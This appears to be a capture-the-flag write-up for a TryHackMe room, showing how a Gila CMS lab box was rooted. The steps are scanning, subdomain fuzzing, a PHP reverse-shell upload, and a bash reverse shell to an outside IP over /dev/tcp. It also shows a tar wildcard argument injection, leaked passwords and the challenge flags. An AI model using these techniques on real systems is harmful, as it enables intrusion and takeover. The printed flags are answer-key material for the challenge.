# [CMesS](https://tryhackme.com/room/cmess)

> Can you root this Gila CMS box?

## Scanning

scan the machine

```
nmap -A -T4 10.10.29.227
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ca733caf-5386-49c6-ad42-76bf0a244dd6)

## HTTP

before starting, add machine to host

```
echo "10.10.29.227 cmess.thm" >> /etc/hosts
```

check webpage, we have a gila cms

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/32887f06-8966-403c-b4df-71e49ec315ea)

i tested with the searchbar, nothing there

check robots.txt, seem nothing

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c535ee25-4263-4a78-8e67-393fe19110ba)

## Enumeration

i found a login but it'seem normal

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/43be46ed-2ab1-434c-a6fc-74b8840b4f5a)

as a hint, scan the subdomain, because of restrict from /etc/hosts, i will use wfuzz

```
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hw 290
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e0a40713-5902-4f34-8452-964b0fa554a8)

```
echo "10.10.58.145 dev.cmess.thm" >> /etc/hosts
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e4a932b9-6415-4a15-96b5-34dda1c597c1)

login to admin panel

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/fd89f306-df61-4496-90f7-8c6a615f0c29)

## Exploitation

now, we can upload a reverse shell

```
cp /usr/share/webshells/php/php-reverse-shell.php .
vi php-reverse-shell.php
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/99351a09-3415-4786-b39d-fdbaee761c72)

after upload, i see our files in /assets

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0573d219-69f8-48a9-8a7b-ba0e7b93d2fa)

```
nc -vlnp 1234
```

click on `http://cmess.thm/assets/php-reverse-shell.php`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b218db2d-0be3-4c6a-a12a-38cf11bb4503)

```
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
```

login to database using the following credential

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a3b83ed4-cb61-4f2a-ad95-0808c276ea7f)

```
mysql -u root -p
r0otus3rpassw0rd
show databases;
use gila;
show tables;
SELECT * FROM user;
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e828658c-c8e8-4a37-a190-8862d5bcd0d9)

when we cracked it we indeed found that it's the pass we already had

i found something in /tmp folder

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7bf9ba22-3896-4016-822a-b92424196ae1)

there also contain a backup password in /opt

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c4a53886-c358-4e97-87d4-53e52f9ff773)

```
su andre
UQfsdCB7aAP6
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3adbe1fa-4077-41e6-8caa-d4694cb84128)

| Flag | user.txt |
| --- | --- |
| Answer | thm{c529b5d5d6ab6b430b7eb1903b2b5e1b} |

## Privilege Escalation

check cronjob, i found something interesting

```
cat /etc/crontab
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/87aac9e1-c9f6-4bd9-b3ea-314671f12c58)

it says root will backup everything in our backup folder to /tmp as tar.gz

quick search, i see a Wildcard injection

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f4936869-89de-4333-b619-5a1ee6002f15)

you can also find it in GTFOBins

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a1b82683-c078-4782-aa4e-0ab9176e9c9a)

create a shell.sh on /home/adre/backup

```
#!/bin/bash
bash -i >& /dev/tcp/10.18.37.45/4444 0>&1
```

then we execute the following

```
echo "" > "--checkpoint-action=exec=bash shell.sh"
echo "" > --checkpoint=1
```

setup a listener

```
nc -lnvp 4444
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/97cca0c8-9874-4981-b251-514f015832c5)

| Flag | root.txt |
| --- | --- |
| Answer | thm{9f85b7fdeb2cf96985bf5761a93546a2} |
